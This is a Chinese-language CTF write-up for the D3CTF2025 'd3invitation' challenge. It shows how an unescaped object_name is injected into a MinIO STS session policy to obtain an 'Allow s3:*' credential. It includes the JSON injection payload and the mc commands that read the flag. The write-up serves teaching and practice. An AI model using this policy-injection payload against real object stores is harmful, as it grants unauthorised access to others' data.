# d3invitation

## 题目简述

题目源码和复现环境位于 `https://github.com/kn1l/D3CTF2025-d3invitation`。仓库的关键信息是：题目由 Web 服务和 MinIO 对象存储接口组成，Web 服务负责根据用户上传的图片和输入的 id 生成邀请函，MinIO 通过 STS 临时凭证控制对象访问权限。解题不依赖仓库外的隐藏逻辑，核心在于 STS policy 的生成方式可被 `object_name` 注入。

题目提供了web 服务和minio 的api 接口，这个web 服务可以通过上传的图片和输入的id 生成一个邀请函。总结一下工作流程：

1. 生成STS 临时凭证

2. 使用这个STS 临时凭证上传图片

3. 生成邀请函时，使用这个STS 临时凭证读取图片

## 解题过程

在生成STS 临时凭证时，我们注意到返回的session_token 是一个jwt

响应中会返回 `access_key_id`、`secret_access_key` 和 `session_token`，其中 `session_token` 是 JWT。JWT 的 payload 中包含 `sessionPolicy` 字段。

jwt 解码后可以看到其中存储了sessionPolicy，是一串经过base64 编码的数据

```json
{
  "alg": "HS512",
  "typ": "JWT"
}
```

```json
{
  "accessKey": "...",
  "exp": 1748773342,
  "parent": "...",
  "sessionPolicy": "eyJWZXJzaW9uIjoiMjAxMi0xMC0xNyIs..."
}
```

再对sessionPolicy 解码后，我们会发现这是生成STS 临时凭证时使用的policy，并且仔细观察可以发现这个policy 应该是依据上传图片的文件名object_name 动态生成的

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject", "s3:PutObject"],
      "Resource": ["arn:aws:s3:::d3invitation/ys.png"]
    }
  ]
}
```

题目没有进行任何过滤，我们可以尝试构造一个特殊的object_name 对policy 进行注入，拿到一个对MinIO 拥有所有权限的STS 临时凭证

```json
{"object_name":"*\"]},{\"Effect\":\"Allow\",\"Action\":[\"s3:*\"],\"Resource\":[\"arn:aws:s3:::*"}
```

注入后，服务端仍返回新的 STS 凭证，但解码后的 policy 中已经额外拼入了 `Allow s3:*`，资源范围也扩展到了 `arn:aws:s3:::*`。

接下来使用这个STS 临时凭证访问MinIO 的api 接口即可拿到flag，我这里以使用mc进行访问为例

```bash
export MC_HOST_d3invitation='http://<access_key_id>:<secret_access_key>:<session_token>@<minio-host>'
mc ls d3invitation
mc ls d3invitation/flag
mc cat d3invitation/flag/flag
```

命令执行后可以枚举到 `flag/flag` 对象并读取其中的 flag。

## 方法总结

- 核心技巧：STS policy 由用户可控的 `object_name` 拼接生成，未做 JSON 转义和权限边界校验，导致可以注入额外的 `Allow s3:*` 策略。
- 识别信号：看到 MinIO / S3 STS、JWT 中携带 `sessionPolicy`，且 policy 内容与文件名等用户输入相关时，应检查 policy 注入和通配符资源提升权限。
- 复用要点：不要只看上传接口本身，临时凭证的权限策略同样是攻击面；拿到扩权 STS 后可直接用 `mc` 或 S3 API 枚举 bucket / object 读取 flag。
